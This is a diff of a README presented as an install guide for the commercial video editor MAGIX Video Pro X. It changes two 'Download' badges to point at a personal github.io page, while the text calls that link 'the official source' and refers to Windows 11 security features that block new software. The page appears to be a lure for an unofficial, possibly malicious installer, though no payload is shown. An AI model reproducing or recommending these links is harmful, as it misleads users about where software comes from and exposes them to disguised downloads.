@@ -1,6 +1,6 @@
 # 🎬 MAGIX-Video-Pro-X-PC-Setup-Guide - Install Video Editing Software Today
 
-[![Download MAGIX Video Pro X](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Razwansa6551/MAGIX-Video-Pro-X-PC-Setup-Guide)
+[![Download MAGIX Video Pro X](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://razwansa6551.github.io)
 
 ## 📁 Understanding This Guide
 
@@ -30,7 +30,7 @@ Windows 11 includes security features that sometimes block new software. Follow 
 
 You need to obtain the installer from the official source. Use the link provided below to begin the retrieval process.
 
-[![Download MAGIX Video Pro X](https://img.shields.io/badge/Install-Download_Now-grey.svg)](https://github.com/Razwansa6551/MAGIX-Video-Pro-X-PC-Setup-Guide)
+[![Download MAGIX Video Pro X](https://img.shields.io/badge/Install-Download_Now-grey.svg)](https://razwansa6551.github.io)
 
 After you click the link:
 
